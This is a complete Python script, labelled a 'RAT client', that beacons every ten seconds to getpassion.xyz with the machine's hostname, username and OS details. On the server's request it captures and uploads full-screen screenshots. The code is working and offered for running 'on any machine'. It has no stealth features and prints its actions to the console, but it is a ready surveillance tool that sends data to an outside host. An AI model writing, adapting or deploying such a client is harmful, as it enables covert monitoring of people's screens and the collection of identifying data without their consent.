#!/usr/bin/env python3
# passion_rat.py — run from anywhere on the user's machine

"""
Passion RAT Client
------------------
Run this on any machine to connect it to your Passion dashboard at getpassion.xyz.
Requires: pip install requests pillow
"""

import os
import sys
import time
import base64
import platform
import getpass
import socket
from io import BytesIO

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")

try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
    print("[warn] Pillow not found — screenshots disabled. pip install pillow to enable.")

# ── Config ────────────────────────────────────────────────────────────────────

SERVER   = "https://getpassion.xyz/api/rat/heartbeat"
SECRET   = "REPLACE_WITH_YOUR_RAT_SECRET"   # must match RAT_SECRET in your .env
INTERVAL = 10        # seconds between heartbeats
JPEG_Q   = 40        # JPEG quality (lower = smaller payload)
MAX_W    = 1280      # max screenshot width
MAX_H    = 720       # max screenshot height

# ── Helpers ───────────────────────────────────────────────────────────────────

def capture_screenshot() -> str | None:
    if not SCREENSHOT_AVAILABLE:
        return None
    try:
        img = ImageGrab.grab()
        w, h = img.size
        if w > MAX_W or h > MAX_H:
            img.thumbnail((MAX_W, MAX_H))
        buf = BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=JPEG_Q, optimize=True)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        print(f"[warn] Screenshot failed: {e}")
        return None


def get_platform() -> str:
    return f"{platform.system()} {platform.release()} ({platform.machine()})"


# ── Main loop ─────────────────────────────────────────────────────────────────

def main():
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info  = get_platform()

    print(f"[*] Connecting to Passion dashboard…")
    print(f"    Host : {hostname}")
    print(f"    User : {username}")

    consecutive_errors = 0

    while True:
        payload = {
            "secret":   SECRET,
            "hostname": hostname,
            "username": username,
            "platform": os_info,
        }

        try:
            resp = requests.post(SERVER, json=payload, timeout=15)

            if resp.status_code == 403:
                sys.exit("[!] Invalid secret. Update SECRET in this script.")

            if resp.status_code == 200:
                data = resp.json()
                consecutive_errors = 0

                if data.get("screenshot_requested"):
                    print("[*] Screenshot requested — capturing…")
                    ss = capture_screenshot()
                    if ss:
                        requests.post(SERVER, json={**payload, "screenshot_b64": ss}, timeout=30)
                        print("[+] Screenshot uploaded.")
                    else:
                        print("[warn] Could not capture screenshot.")
            else:
                print(f"[warn] Unexpected status {resp.status_code}")

        except requests.RequestException as e:
            consecutive_errors += 1
            print(f"[warn] Network error ({consecutive_errors}): {e}")
            if consecutive_errors >= 10:
                print("[!] Too many errors — sleeping 60s.")
                time.sleep(60)
                consecutive_errors = 0

        time.sleep(INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Disconnected.")